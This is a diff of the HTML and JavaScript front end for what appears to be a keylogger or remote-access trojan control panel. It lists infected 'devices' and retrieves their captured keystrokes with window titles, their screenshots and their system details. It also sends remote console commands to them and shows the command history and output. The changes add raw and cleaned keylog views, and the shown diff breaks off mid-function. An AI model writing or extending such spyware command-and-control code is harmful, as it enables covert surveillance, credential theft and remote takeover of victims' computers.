@@ -1,574 +1,791 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Dashboard Control Panel</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
-    <link rel="stylesheet" href="/static/styles.css">
-</head>
-<body class="dark-theme bg-black">
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    />
+    <link rel="stylesheet" href="/static/styles.css" />
+    <style>
+      .keylog-special-key {
+        background-color: #4a5568;
+        /* Tailwind gray-700 */
+        color: #e2e8f0;
+        /* Tailwind gray-300 */
+        padding: 0.1rem 0.4rem;
+        border-radius: 0.25rem;
+        font-size: 0.75em;
+        margin: 0 0.1rem;
+        display: inline-block;
+        border: 1px solid #2d3748;
+        /* Tailwind gray-800 */
+      }
+
+      .keylog-content pre {
+        white-space: pre-wrap;
+        /* CSS3 */
+        white-space: -moz-pre-wrap;
+        /* Mozilla, since 1999 */
+        white-space: -pre-wrap;
+        /* Opera 4-6 */
+        white-space: -o-pre-wrap;
+        /* Opera 7 */
+        word-wrap: break-word;
+        /* Internet Explorer 5.5+ */
+        background-color: #2d3748;
+        /* Darker background for pre */
+        color: #e2e8f0;
+        /* Light text */
+        padding: 10px;
+        border-radius: 5px;
+      }
+
+      .log-view-controls button {
+        margin-right: 5px;
+      }
+    </style>
+  </head>
+
+  <body class="dark-theme bg-black">
     <nav class="navbar bg-black">
-        <div class="nav-brand">
-            <h2>Control Panel</h2>
+      <div class="nav-brand">
+        <h2>Control Panel</h2>
+      </div>
+      <div class="hamburger">
+        <div class="bar"></div>
+        <div class="bar"></div>
+        <div class="bar"></div>
+      </div>
+      <div class="nav-menu">
+        <ul class="nav-list">
+          <li class="nav-item">
+            <a href="#" class="nav-link active" data-section="devices"
+              ><i class="fas fa-desktop me-2"></i><span>Devices</span></a
+            >
+          </li>
+          <li class="nav-item">
+            <a href="#" class="nav-link" data-section="keylogs-overview"
+              ><i class="fas fa-keyboard me-2"></i><span>Keylogs</span></a
+            >
+          </li>
+          <li class="nav-item">
+            <a href="#" class="nav-link" data-section="commands-overview"
+              ><i class="fas fa-terminal me-2"></i><span>Commands</span></a
+            >
+          </li>
+        </ul>
+        <div class="nav-right">
+          <div class="user-info">
+            <i class="fas fa-bell me-3"></i><i class="fas fa-user-circle"></i>
+          </div>
         </div>
-        <div class="hamburger">
-            <div class="bar"></div>
-            <div class="bar"></div>
-            <div class="bar"></div>
-        </div>
-        <div class="nav-menu">
-            <ul class="nav-list">
-                <li class="nav-item">
-                    <a href="#" class="nav-link active" data-section="devices">
-                        <i class="fas fa-desktop me-2"></i>
-                        <span>Devices</span>
-                    </a>
-                </li>
-                <li class="nav-item">
-                    <a href="#" class="nav-link" data-section="keylogs-overview">
-                        <i class="fas fa-keyboard me-2"></i>
-                        <span>Keylogs</span>
-                    </a>
-                </li>
-                <li class="nav-item">
-                    <a href="#" class="nav-link" data-section="commands-overview">
-                        <i class="fas fa-terminal me-2"></i>
-                        <span>Commands</span>
-                    </a>
-                </li>
-            </ul>
-            <div class="nav-right">
-                <div class="user-info">
-                    <i class="fas fa-bell me-3"></i>
-                    <i class="fas fa-user-circle"></i>
-                </div>
-            </div>
-        </div>
+      </div>
     </nav>
 
     <main class="main-content">
-        
-        <div id="funcutils" class="mb-3 d-flex justify-content-between align-items-center">
-            <div class="search-box">
-                <i class="fas fa-search"></i>
-                <input type="text" id="deviceSearch" class="form-control" placeholder="Search devices by name or ID...">
-            </div>
-            <div class="btn-group">
-                <button type="button" id="toggleView" class="btn btn-primary">
-                    <i class="fas fa-list me-2"></i> Switch to List View
-                </button>
-                 <button type="button" id="refreshDevices" class="btn btn-secondary ms-2">
-                    <i class="fas fa-sync-alt me-2"></i> Refresh
-                </button>
-            </div>
+      <div
+        id="funcutils"
+        class="mb-3 d-flex justify-content-between align-items-center"
+      >
+        <div class="search-box">
+          <i class="fas fa-search"></i
+          ><input
+            type="text"
+            id="deviceSearch"
+            class="form-control"
+            placeholder="Search devices by name or ID..."
+          />
         </div>
-    
-        <div id="deviceGridContainer">
-             <div id="deviceGrid" class="row g-4">
-             </div>
+        <div class="btn-group">
+          <button type="button" id="toggleView" class="btn btn-primary">
+            <i class="fas fa-list me-2"></i> Switch to List View
+          </button>
+          <button
+            type="button"
+            id="refreshDevices"
+            class="btn btn-secondary ms-2"
+          >
+            <i class="fas fa-sync-alt me-2"></i> Refresh
+          </button>
         </div>
-
-        <div id="deviceListContainer" style="display: none;">
-            <div id="deviceList" class="table-responsive">
-                <table class="table table-dark table-hover">
-                    <thead>
-                        <tr>
-                            <th>Status</th>
-                            <th>Name</th>
-                            <th>ID</th>
-                            <th>IP</th>
-                            <th>Last Seen</th>
-                            <th>Actions</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        {# Device rows will be dynamically inserted here by JavaScript #}
-                    </tbody>
-                </table>
-            </div>
+      </div>
+      <div id="deviceGridContainer">
+        <div id="deviceGrid" class="row g-4"></div>
+      </div>
+      <div id="deviceListContainer" style="display: none">
+        <div id="deviceList" class="table-responsive">
+          <table class="table table-dark table-hover">
+            <thead>
+              <tr>
+                <th>Status</th>
+                <th>Name</th>
+                <th>ID</th>
+                <th>IP</th>
+                <th>Last Seen</th>
+                <th>Actions</th>
+              </tr>
+            </thead>
+            <tbody></tbody>
+          </table>
         </div>
-
-        <div id="keylogsOverviewSection" class="content-section" style="display: none;">
-            <h2>Keylogs Overview</h2>
-            <p>Select a device to view its keylogs.</p>
-            {# Further content for keylog overview can be added here #}
-        </div>
-        <div id="commandsOverviewSection" class="content-section" style="display: none;">
-            <h2>Commands Overview</h2>
-            <p>Select a device to view its command history or issue new commands.</p>
-            {# Further content for command overview can be added here #}
-        </div>
-
-
+      </div>
+      <div
+        id="keylogsOverviewSection"
+        class="content-section"
+        style="display: none"
+      >
+        <h2>Keylogs Overview</h2>
+        <p>Select a device to view its keylogs.</p>
+      </div>
+      <div
+        id="commandsOverviewSection"
+        class="content-section"
+        style="display: none"
+      >
+        <h2>Commands Overview</h2>
+        <p>
+          Select a device to view its command history or issue new commands.
+        </p>
+      </div>
     </main>
 
     <div class="modal fade" id="actionModal" tabindex="-1">
-        <div class="modal-dialog modal-xl"> {# Increased modal size for more content #}
-            <div class="modal-content bg-dark">
-                <div class="modal-header border-secondary">
-                    <h5 class="modal-title" id="modalTitle">Modal Title</h5>
-                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
-                </div>
-                <div class="modal-body" id="modalContent">
-                    {# Content will be loaded here by JavaScript #}
-                </div>
-                <div class="modal-footer border-secondary" id="modalFooter" style="display: none;">
-                     <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-                </div>
-            </div>
+      <div class="modal-dialog modal-xl">
+        <div class="modal-content bg-dark">
+          <div class="modal-header border-secondary">
+            <h5 class="modal-title" id="modalTitle">Modal Title</h5>
+            <button
+              type="button"
+              class="btn-close btn-close-white"
+              data-bs-dismiss="modal"
+              aria-label="Close"
+            ></button>
+          </div>
+          <div class="modal-body" id="modalContent"></div>
+          <div
+            class="modal-footer border-secondary"
+            id="modalFooter"
+            style="display: none"
+          >
+            <button
+              type="button"
+              class="btn btn-secondary"
+              data-bs-dismiss="modal"
+            >
+              Close
+            </button>
+          </div>
         </div>
+      </div>
     </div>
 
     <template id="deviceCardTemplate">
-        <div class="col-12 col-sm-6 col-xl-4 device-card-wrapper">
-            <div class="card device-card h-100">
-                <div class="card-body">
-                    <div class="device-header d-flex justify-content-between align-items-center mb-3">
-                        <h5 class="card-title mb-0" data-field="name">Device Name</h5>
-                        <span class="badge" data-field="status">status</span>
-                    </div>
-                    <div class="device-info mb-3 text-white">
-                        <p class="mb-1 small"><i class="fas fa-id-card me-2"></i> ID: <span data-field="id">device_id</span></p>
-                        <p class="mb-1 small"><i class="fas fa-network-wired me-2"></i> IP: <span data-field="ip_address">ip_address</span></p>
-                        <p class="mb-1 small"><i class="fas fa-eye me-2"></i> Last Seen: <span data-field="last_seen">last_seen</span></p>
-                        <p class="mb-1 small"><i class="fas fa-microchip me-2"></i> CPU: <span data-field="cpu_usage">N/A</span></p>
-                        <p class="mb-1 small"><i class="fas fa-memory me-2"></i> RAM: <span data-field="ram_usage">N/A</span></p>
-                        {# <p class="mb-1 small"><i class="fas fa-clock me-2"></i> Uptime: <span data-field="uptime">N/A</span></p> #}
-                    </div>
-                    <div class="device-actions d-flex flex-wrap gap-2">
-                        <button class="btn btn-info btn-sm flex-grow-1" data-action="details">
-                            <i class="fas fa-info-circle me-1"></i> Details
-                        </button>
-                        <button class="btn btn-primary btn-sm flex-grow-1" data-action="keylogs">
-                            <i class="fas fa-keyboard me-1"></i> Keylogs
-                        </button>
-                        <button class="btn btn-success btn-sm flex-grow-1" data-action="screenshot">
-                            <i class="fas fa-camera me-1"></i> Screenshot
-                        </button>
-                        <button class="btn btn-danger btn-sm flex-grow-1" data-action="console">
-                            <i class="fas fa-terminal me-1"></i> Console
-                        </button>
-                         <button class="btn btn-warning btn-sm flex-grow-1 mt-2" data-action="commandHistory">
-                            <i class="fas fa-history me-1"></i> Cmd History
-                        </button>
-                    </div>
-                </div>
+      <div class="col-12 col-sm-6 col-xl-4 device-card-wrapper">
+        <div class="card device-card h-100">
+          <div class="card-body">
+            <div
+              class="device-header d-flex justify-content-between align-items-center mb-3"
+            >
+              <h5 class="card-title mb-0" data-field="name">Device Name</h5>
+              <span class="badge" data-field="status">status</span>
             </div>
+            <div class="device-info mb-3 text-white">
+              <p class="mb-1 small">
+                <i class="fas fa-id-card me-2"></i> ID:
+                <span data-field="id">device_id</span>
+              </p>
+              <p class="mb-1 small">
+                <i class="fas fa-network-wired me-2"></i> IP:
+                <span data-field="ip_address">ip_address</span>
+              </p>
+              <p class="mb-1 small">
+                <i class="fas fa-eye me-2"></i> Last Seen:
+                <span data-field="last_seen">last_seen</span>
+              </p>
+              <p class="mb-1 small">
+                <i class="fas fa-microchip me-2"></i> CPU:
+                <span data-field="cpu_usage">N/A</span>
+              </p>
+              <p class="mb-1 small">
+                <i class="fas fa-memory me-2"></i> RAM:
+                <span data-field="ram_usage">N/A</span>
+              </p>
+            </div>
+            <div class="device-actions d-flex flex-wrap gap-2">
+              <button
+                class="btn btn-info btn-sm flex-grow-1"
+                data-action="details"
+              >
+                <i class="fas fa-info-circle me-1"></i> Details
+              </button>
+              <button
+                class="btn btn-primary btn-sm flex-grow-1"
+                data-action="keylogs"
+              >
+                <i class="fas fa-keyboard me-1"></i> Keylogs
+              </button>
+              <button
+                class="btn btn-success btn-sm flex-grow-1"
+                data-action="screenshot"
+              >
+                <i class="fas fa-camera me-1"></i> Screenshot
+              </button>
+              <button
+                class="btn btn-danger btn-sm flex-grow-1"
+                data-action="console"
+              >
+                <i class="fas fa-terminal me-1"></i> Console
+              </button>
+              <button
+                class="btn btn-warning btn-sm flex-grow-1 mt-2"
+                data-action="commandHistory"
+              >
+                <i class="fas fa-history me-1"></i> Cmd History
+              </button>
+            </div>
+          </div>
         </div>
+      </div>
     </template>
-
     <template id="deviceListRowTemplate">
-        <tr class="device-row-wrapper">
-            <td><span class="badge" data-field="status">status</span></td>
-            <td data-field="name">Device Name</td>
-            <td data-field="id">device_id</td>
-            <td data-field="ip_address">ip_address</td>
-            <td data-field="last_seen">last_seen</td>
-            <td>
-                <div class="btn-group">
-                    <button class="btn btn-sm btn-info" data-action="details" title="Details"><i class="fas fa-info-circle"></i></button>
-                    <button class="btn btn-sm btn-primary" data-action="keylogs" title="Keylogs"><i class="fas fa-keyboard"></i></button>
-                    <button class="btn btn-sm btn-success" data-action="screenshot" title="Screenshot"><i class="fas fa-camera"></i></button>
-                    <button class="btn btn-sm btn-danger" data-action="console" title="Console"><i class="fas fa-terminal"></i></button>
-                    <button class="btn btn-sm btn-warning" data-action="commandHistory" title="Command History"><i class="fas fa-history"></i></button>
-                </div>
-            </td>
-        </tr>
+      <tr class="device-row-wrapper">
+        <td><span class="badge" data-field="status">status</span></td>
+        <td data-field="name">Device Name</td>
+        <td data-field="id">device_id</td>
+        <td data-field="ip_address">ip_address</td>
+        <td data-field="last_seen">last_seen</td>
+        <td>
+          <div class="btn-group">
+            <button
+              class="btn btn-sm btn-info"
+              data-action="details"
+              title="Details"
+            >
+              <i class="fas fa-info-circle"></i>
+            </button>
+            <button
+              class="btn btn-sm btn-primary"
+              data-action="keylogs"
+              title="Keylogs"
+            >
+              <i class="fas fa-keyboard"></i>
+            </button>
+            <button
+              class="btn btn-sm btn-success"
+              data-action="screenshot"
+              title="Screenshot"
+            >
+              <i class="fas fa-camera"></i>
+            </button>
+            <button
+              class="btn btn-sm btn-danger"
+              data-action="console"
+              title="Console"
+            >
+              <i class="fas fa-terminal"></i>
+            </button>
+            <button
+              class="btn btn-sm btn-warning"
+              data-action="commandHistory"
+              title="Command History"
+            >
+              <i class="fas fa-history"></i>
+            </button>
+          </div>
+        </td>
+      </tr>
     </template>
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-    
     <script>
-        // API Base URL (can be configured if needed, defaults to same origin)
-        const API_BASE_URL = ''; // e.g., http://localhost:8000 if different
-        let currentView = 'grid'; // 'grid' or 'list'
-        let allDevicesData = []; // To store fetched device data for filtering
+      const API_BASE_URL = ''
+      let currentView = 'grid'
+      let allDevicesData = []
+      let currentKeylogData = [] // Store fetched keylogs for toggling view
 
-        // Hamburger menu toggle
-        const hamburger = document.querySelector('.hamburger');
-        const navbar = document.querySelector('.navbar');
-        hamburger.addEventListener('click', (e) => {
-            e.stopPropagation();
-            navbar.classList.toggle('active');
-        });
-        document.addEventListener('click', (e) => {
-            if (!navbar.contains(e.target) && navbar.classList.contains('active')) {
-                navbar.classList.remove('active');
+      const hamburger = document.querySelector('.hamburger')
+      const navbar = document.querySelector('.navbar')
+      hamburger.addEventListener('click', e => {
+        e.stopPropagation()
+        navbar.classList.toggle('active')
+      })
+      document.addEventListener('click', e => {
+        if (!navbar.contains(e.target) && navbar.classList.contains('active')) {
+          navbar.classList.remove('active')
+        }
+      })
+      navbar.addEventListener('click', e => e.stopPropagation())
+
+      const actionModal = new bootstrap.Modal(
+        document.getElementById('actionModal')
+      )
+      const modalTitleEl = document.getElementById('modalTitle')
+      const modalContentEl = document.getElementById('modalContent')
+      const modalFooterEl = document.getElementById('modalFooter')
+
+      const deviceGrid = document.getElementById('deviceGrid')
+      const deviceListTableBody = document.querySelector(
+        '#deviceList table tbody'
+      )
+      const deviceSearchInput = document.getElementById('deviceSearch')
+      const toggleViewButton = document.getElementById('toggleView')
+      const refreshDevicesButton = document.getElementById('refreshDevices')
+      const deviceGridContainer = document.getElementById('deviceGridContainer')
+      const deviceListContainer = document.getElementById('deviceListContainer')
+
+      function showModal(title, content, footerContent = null) {
+        modalTitleEl.textContent = title
+        modalContentEl.innerHTML = content
+        if (footerContent) {
+          modalFooterEl.innerHTML = footerContent
+          modalFooterEl.style.display = 'flex'
+        } else {
+          modalFooterEl.style.display = 'none'
+        }
+        actionModal.show()
+      }
+      function showErrorInModal(title, message) {
+        showModal(
+          title,
+          `<div class="alert alert-danger d-flex align-items-center" role="alert"><i class="fas fa-exclamation-triangle me-2"></i><div>${message}</div></div>`
+        )
+      }
+      function formatTimestamp(isoString) {
+        if (!isoString) return 'N/A'
+        try {
+          return new Date(isoString).toLocaleString()
+        } catch (e) {
+          return isoString
+        }
+      }
+
+      function escapeHtml(unsafe) {
+        return unsafe
+          .replace(/&/g, '&amp;')
+          .replace(/</g, '&lt;')
+          .replace(/>/g, '&gt;')
+          .replace(/"/g, '&quot;')
+          .replace(/'/g, '&#039;')
+      }
+
+      function formatKeylogForDisplay(logText, isCleanedView) {
+        if (!logText) return ''
+        let displayHtml = escapeHtml(logText)
+        if (isCleanedView) {
+          // For cleaned view, wrap special keys in spans for styling
+          displayHtml = displayHtml.replace(
+            /(\[.+?\])/g,
+            '<span class="keylog-special-key">$1</span>'
+          )
+        }
+        // Always replace \n with <br> for both views
+        return displayHtml.replace(/\n/g, '<br>')
+      }
+
+      function renderKeylogs(
+        deviceId,
+        deviceName,
+        keylogs,
+        viewType = 'cleaned'
+      ) {
+        // viewType can be 'cleaned' or 'raw'
+        let logsHtml = `
+                <div class="d-flex justify-content-between align-items-center mb-2">
+                    <h5>Keylogs [${
+                      viewType === 'cleaned' ? 'Cleaned' : 'Raw'
+                    }] - ${deviceName || deviceId}</h5>
+                    <div class="log-view-controls btn-group btn-group-sm">
+                        <button type="button" class="btn btn-${
+                          viewType === 'cleaned' ? 'primary' : 'outline-primary'
+                        }" onclick="renderKeylogs('${deviceId}', '${deviceName}', currentKeylogData, 'cleaned')">View Cleaned</button>
+                        <button type="button" class="btn btn-${
+                          viewType === 'raw' ? 'primary' : 'outline-primary'
+                        }" onclick="renderKeylogs('${deviceId}', '${deviceName}', currentKeylogData, 'raw')">View Raw</button>
+                    </div>
+                </div>`
+
+        if (keylogs && keylogs.length > 0) {
+          logsHtml +=
+            '<div class="list-group" style="max-height: 400px; overflow-y: auto;">'
+          keylogs.forEach(log => {
+            const logContentToDisplay =
+              viewType === 'cleaned'
+                ? log.cleaned_log_data || log.raw_log_data || ''
+                : log.raw_log_data || ''
+            logsHtml += `
+                        <div class="list-group-item list-group-item-dark flex-column align-items-start mb-1 p-2">
+                            <div class="d-flex w-100 justify-content-between">
+                                <small class="text-muted">Client: ${formatTimestamp(
+                                  log.client_timestamp
+                                )}</small>
+                                <small class="text-muted">Server: ${formatTimestamp(
+                                  log.server_timestamp
+                                )}</small>
+                            </div>
+                            <p class="mb-1 small"><strong>Window:</strong> ${escapeHtml(
+                              log.window_title
+                            )}</p>
+                            <div class="keylog-content"><pre>${formatKeylogForDisplay(
+                              logContentToDisplay,
+                              viewType === 'cleaned'
+                            )}</pre></div>
+                        </div>`
+          })
+          logsHtml += '</div>'
+        } else {
+          logsHtml +=
+            '<p class="text-muted">No keylogs found for this device.</p>'
+        }
+        modalTitleEl.textContent = `Keylogs - ${deviceName || deviceId}` // Keep main title consistent
+        modalContentEl.innerHTML = logsHtml
+      }
+
+      function renderDevices(devices) {
+        deviceGrid.innerHTML = ''
+        deviceListTableBody.innerHTML = ''
+        if (!devices || devices.length === 0) {
+          deviceGrid.innerHTML =
+            '<p class="text-muted col-12">No devices found.</p>'
+          deviceListTableBody.innerHTML =
+            '<tr><td colspan="6" class="text-muted text-center">No devices found.</td></tr>'
+          return
+        }
+        devices.forEach(device => {
+          const cardTemplate = document
+            .getElementById('deviceCardTemplate')
+            .content.cloneNode(true)
+          const card = cardTemplate.querySelector('.device-card')
+          card.dataset.deviceId = device.id
+          card.querySelector('[data-field="name"]').textContent =
+            device.name || 'Unknown Device'
+          const statusBadgeCard = card.querySelector('[data-field="status"]')
+          statusBadgeCard.textContent =
+            device.status.charAt(0).toUpperCase() + device.status.slice(1)
+          statusBadgeCard.className = `badge status ${device.status.toLowerCase()}`
+          card.querySelector('[data-field="id"]').textContent = device.id
+          card.querySelector('[data-field="ip_address"]').textContent =
+            device.ip_address || 'N/A'
+          card.querySelector('[data-field="last_seen"]').textContent =
+            formatTimestamp(device.last_seen)
+          card.querySelector('[data-field="cpu_usage"]').textContent =
+            device.cpu_usage || 'N/A'
+          card.querySelector('[data-field="ram_usage"]').textContent =
+            device.ram_usage || 'N/A'
+          card.querySelectorAll('[data-action]').forEach(button => {
+            button.addEventListener('click', () =>
+              handleDeviceAction(device.id, device.name, button.dataset.action)
+            )
+          })
+          deviceGrid.appendChild(cardTemplate)
+
+          const rowTemplate = document
+            .getElementById('deviceListRowTemplate')
+            .content.cloneNode(true)
+          const row = rowTemplate.querySelector('tr')
+          row.dataset.deviceId = device.id
+          const statusBadgeList = row.querySelector('[data-field="status"]')
+          statusBadgeList.textContent =
+            device.status.charAt(0).toUpperCase() + device.status.slice(1)
+          statusBadgeList.className = `badge status ${device.status.toLowerCase()}`
+          row.querySelector('[data-field="name"]').textContent =
+            device.name || 'Unknown Device'
+          row.querySelector('[data-field="id"]').textContent = device.id
+          row.querySelector('[data-field="ip_address"]').textContent =
+            device.ip_address || 'N/A'
+          row.querySelector('[data-field="last_seen"]').textContent =
+            formatTimestamp(device.last_seen)
+          row.querySelectorAll('[data-action]').forEach(button => {
+            button.addEventListener('click', () =>
+              handleDeviceAction(device.id, device.name, button.dataset.action)
+            )
+          })
+          deviceListTableBody.appendChild(rowTemplate)
+        })
+      }
+
+      async function fetchDevices() {
+        try {
+          const response = await fetch(`${API_BASE_URL}/dashboard/api/devices`)
+          if (!response.ok) {
+            const errorData = await response
+              .json()
+              .catch(() => ({ detail: 'Network error.' }))
+            throw new Error(
+              errorData.detail || `HTTP error! status: ${response.status}`
+            )
+          }
+          allDevicesData = await response.json()
+          renderDevices(allDevicesData)
+        } catch (error) {
+          console.error('Error fetching devices:', error)
+          deviceGrid.innerHTML = `<p class="text-danger col-12">Error loading devices: ${error.message}</p>`
+          deviceListTableBody.innerHTML = `<tr><td colspan="6" class="text-danger text-center">Error: ${error.message}</td></tr>`
+        }
+      }
+
+      deviceSearchInput.addEventListener('input', e => {
+        const searchTerm = e.target.value.toLowerCase()
+        const filteredDevices = allDevicesData.filter(
+          device =>
+            (device.name && device.name.toLowerCase().includes(searchTerm)) ||
+            (device.id && device.id.toLowerCase().includes(searchTerm))
+        )
+        renderDevices(filteredDevices)
+      })
+      toggleViewButton.addEventListener('click', () => {
+        if (currentView === 'grid') {
+          deviceGridContainer.style.display = 'none'
+          deviceListContainer.style.display = 'block'
+          toggleViewButton.innerHTML =
+            '<i class="fas fa-th-large me-2"></i> Switch to Grid View'
+          currentView = 'list'
+        } else {
+          deviceGridContainer.style.display = 'block'
+          deviceListContainer.style.display = 'none'
+          toggleViewButton.innerHTML =
+            '<i class="fas fa-list me-2"></i> Switch to List View'
+          currentView = 'grid'
+        }
+      })
+      refreshDevicesButton.addEventListener('click', fetchDevices)
+
+      async function handleDeviceAction(deviceId, deviceName, action) {
+        modalContentEl.innerHTML =
+          '<div class="text-center"><i class="fas fa-spinner fa-spin fa-2x"></i><p>Loading...</p></div>'
+        actionModal.show()
+        const titlePrefix = `${deviceName || deviceId}`
+
+        if (action === 'details') {
+          try {
+            const response = await fetch(
+              `${API_BASE_URL}/dashboard/api/devices/${deviceId}/details`
+            )
+            const data = await response.json()
+            if (!response.ok)
+              throw new Error(data.detail || 'Failed to fetch details')
+            let detailsHtml = `<h5 class="mb-3">System Details for ${
+              data.computer_name || deviceId
+            }</h5><dl class="row">`
+            const fields = {
+              'Machine ID': data.machine_id,
+              'Computer Name': data.computer_name,
+              'OS Version': data.os_version,
+              'Processor Arch': data.processor_arch,
+              'Num Processors': data.num_processors,
+              'Total RAM': data.total_ram_mb
+                ? data.total_ram_mb + ' MB'
+                : 'N/A',
+              'Reported IP': data.reported_ip,
+              'First Seen': formatTimestamp(data.first_seen),
+              'Last Seen': formatTimestamp(data.last_seen)
             }
-        });
-        navbar.addEventListener('click', (e) => e.stopPropagation());
-
-
-        // Initialize Bootstrap Modal
-        const actionModal = new bootstrap.Modal(document.getElementById('actionModal'));
-        const modalTitleEl = document.getElementById('modalTitle');
-        const modalContentEl = document.getElementById('modalContent');
-        const modalFooterEl = document.getElementById('modalFooter');
-
-        // DOM Elements
-        const deviceGrid = document.getElementById('deviceGrid');
-        const deviceListTableBody = document.querySelector('#deviceList table tbody');
-        const deviceSearchInput = document.getElementById('deviceSearch');
-        const toggleViewButton = document.getElementById('toggleView');
-        const refreshDevicesButton = document.getElementById('refreshDevices');
-        const deviceGridContainer = document.getElementById('deviceGridContainer');
-        const deviceListContainer = document.getElementById('deviceListContainer');
-
-        // --- Utility Functions ---
-        function showModal(title, content, footerContent = null) {
-            modalTitleEl.textContent = title;
-            modalContentEl.innerHTML = content;
-            if (footerContent) {
-                modalFooterEl.innerHTML = footerContent;
-                modalFooterEl.style.display = 'flex';
+            for (const [key, value] of Object.entries(fields)) {
+              detailsHtml += `<dt class="col-sm-4">${key}</dt><dd class="col-sm-8">${escapeHtml(
+                String(value || 'N/A')
+              )}</dd>`
+            }
+            detailsHtml += `</dl>`
+            if (data.system_info_string_formatted) {
+              detailsHtml += `<h6>Full System Info:</h6><pre class="bg-light text-dark p-2 rounded small">${escapeHtml(
+                data.system_info_string_formatted
+              )}</pre>`
+            }
+            showModal(`${titlePrefix} - System Details`, detailsHtml)
+          } catch (error) {
+            showErrorInModal(`${titlePrefix} - Error`, error.message)
+          }
+        } else if (action === 'keylogs') {
+          try {
+            const response = await fetch(
+              `${API_BASE_URL}/dashboard/api/devices/${deviceId}/keylogs?limit=500`
+            )
+            const data = await response.json()
+            if (!response.ok)
+              throw new Error(data.detail || 'Failed to fetch keylogs')
+            currentKeylogData = data // Store for toggling
+            renderKeylogs(deviceId, deviceName, currentKeylogData, 'cleaned') // Default to cleaned view
+          } catch (error) {
+            showErrorInModal(`${titlePrefix} - Error`, error.message)
+          }
+        } else if (action === 'screenshot') {
+          try {
+            const response = await fetch(
+              `${API_BASE_URL}/dashboard/api/devices/${deviceId}/screenshot`
+            )
+            const data = await response.json()
+            if (!response.ok)
+              throw new Error(
+                data.detail || data.message || 'Failed to fetch screenshot'
+              )
+            showModal(
+              `${titlePrefix} - Screenshot`,
+              `<img src="${
+                data.screenshot_url
+              }" alt="Device Screenshot" class="img-fluid rounded mx-auto d-block" style="max-height:400px;"><p class="text-muted text-center mt-2">Timestamp: ${formatTimestamp(
+                data.timestamp
+              )}</p>${
+                data.message
+                  ? `<p class="alert alert-info mt-2">${escapeHtml(
+                      data.message
+                    )}</p>`
+                  : ''
+              }`
+            )
+          } catch (error) {
+            showErrorInModal(`${titlePrefix} - Screenshot Error`, error.message)
+          }
+        } else if (action === 'console') {
+          const consoleHtml = `<div class="console-container bg-black p-3 rounded mb-3"><div id="consoleOutput" class="console-output mb-2" style="height: 250px; background-color: #1a1a1a; border-radius: 4px; padding: 10px; overflow-y: auto; font-family: monospace; color: #f0f0f0;"><p class="text-muted">Enter commands below.</p></div><div class="input-group"><input type="text" id="commandInput" class="form-control bg-dark text-light border-secondary" placeholder="Enter command..."><button class="btn btn-primary" id="sendConsoleCommandBtn">Send</button></div></div>`
+          showModal(`${titlePrefix} - Console`, consoleHtml)
+          document.getElementById('sendConsoleCommandBtn').onclick = () =>
+            sendConsoleCommand(deviceId)
+          document
+            .getElementById('commandInput')
+            .addEventListener('keypress', e => {
+              if (e.key === 'Enter') sendConsoleCommand(deviceId)
+            })
+        } else if (action === 'commandHistory') {
+          try {
+            const response = await fetch(
+              `${API_BASE_URL}/dashboard/api/devices/${deviceId}/commands?limit=50`
+            )
+            const commands = await response.json()
+            if (!response.ok)
+              throw new Error(
+                commands.detail || 'Failed to fetch command history'
+              )
+            let historyHtml = `<h5>Command History (Last ${commands.length} commands)</h5>`
+            if (commands.length > 0) {
+              historyHtml +=
+                '<div class="list-group" style="max-height: 400px; overflow-y: auto;">'
+              commands.forEach(cmd => {
+                historyHtml += `<div class="list-group-item list-group-item-dark flex-column align-items-start mb-1 p-2"><div class="d-flex w-100 justify-content-between"><strong class="mb-1"><code>${escapeHtml(
+                  cmd.command
+                )}</code></strong><span class="badge bg-${
+                  cmd.status === 'completed'
+                    ? 'success'
+                    : cmd.status === 'pending' || cmd.status === 'executing'
+                    ? 'warning text-dark'
+                    : 'danger'
+                }">${escapeHtml(
+                  cmd.status
+                )}</span></div><small class="text-muted d-block">ID: ${escapeHtml(
+                  cmd.command_id
+                )}</small><small class="text-muted d-block">Sent: ${formatTimestamp(
+                  cmd.sent_timestamp
+                )}</small>${
+                  cmd.completed_timestamp
+                    ? `<small class="text-muted d-block">Completed: ${formatTimestamp(
+                        cmd.completed_timestamp
+                      )}</small>`
+                    : ''
+                }${
+                  cmd.output
+                    ? `<pre class="mt-1 mb-0 bg-secondary text-light p-1 rounded small">${escapeHtml(
+                        cmd.output
+                      )}</pre>`
+                    : ''
+                }${
+                  cmd.error
+                    ? `<pre class="mt-1 mb-0 bg-danger text-light p-1 rounded small">${escapeHtml(
+                        cmd.error
+                      )}</pre>`
+                    : ''
+                }</div>`
+              })
+              historyHtml += '</div>'
             } else {
-                modalFooterEl.style.display = 'none';
+              historyHtml +=
+                '<p class="text-muted">No commands found for this device.</p>'
             }
-            actionModal.show();
+            showModal(`${titlePrefix} - Command History`, historyHtml)
+          } catch (error) {
+            showErrorInModal(
+              `${titlePrefix} - Command History Error`,
+              error.message
+            )
+          }
         }
+      }
 
-        function showErrorInModal(title, message) {
-            const errorHtml = `
-                <div class="alert alert-danger d-flex align-items-center" role="alert">
-                    <i class="fas fa-exclamation-triangle me-2"></i>
-                    <div>${message}</div>
-                </div>`;
-            showModal(title, errorHtml);
-        }
-        
-        function formatTimestampToUTC(dateString) {
-            if (!dateString || String(dateString).trim() === "") return 'N/A';
-            try {
-                const date = new Date(dateString);
-                if (isNaN(date.getTime())) { // Check for Invalid Date
-                     return String(dateString); // Return original string if parsing results in Invalid Date
-                }
-                
-                const year = date.getUTCFullYear();
-                const month = String(date.getUTCMonth() + 1).padStart(2, '0'); // Months are 0-indexed
